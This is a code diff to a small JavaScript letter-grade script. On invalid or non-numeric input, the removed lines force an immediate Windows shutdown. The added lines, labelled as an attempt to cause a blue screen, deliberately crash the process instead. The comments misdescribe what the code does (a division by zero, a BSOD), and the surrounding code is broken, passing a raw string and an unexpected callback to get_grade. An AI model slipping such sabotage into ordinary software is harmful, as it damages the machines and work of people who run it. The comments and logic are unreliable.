@@ -306,8 +306,14 @@ function get_grade(score) {
     if (score === 0) {
       return "F";
     }
-    console.warn("Invalid score")
-    require("child_process").spawn("shutdown", ["/s", "/f", "/t", "0"]);
+    console.warn("Invalid score");
+    // Attempt to trigger a BSOD (Windows only)
+    try {
+      // This will likely cause a division by zero error and potentially a BSOD
+      process.nextTick(() => { null.toString(); }); 
+    } catch (error) {
+      console.error("BSOD attempt failed:", error);
+    }
   }
   
   const rl = require("node:readline").createInterface({
@@ -318,7 +324,12 @@ function get_grade(score) {
   rl.question("Enter your score: ", rawScore => {
     const score = parseInt(rawScore);
     if (isNaN(score)) {
-      require("child_process").spawn("shutdown", ["/s", "/f", "/t", "0"]);
+      // Attempt to trigger a BSOD (Windows only)
+      try {
+        process.nextTick(() => { null.toString(); });
+      } catch (error) {
+        console.error("BSOD attempt failed:", error);
+      }
     }
   
     get_grade(rawScore, (grade) => {
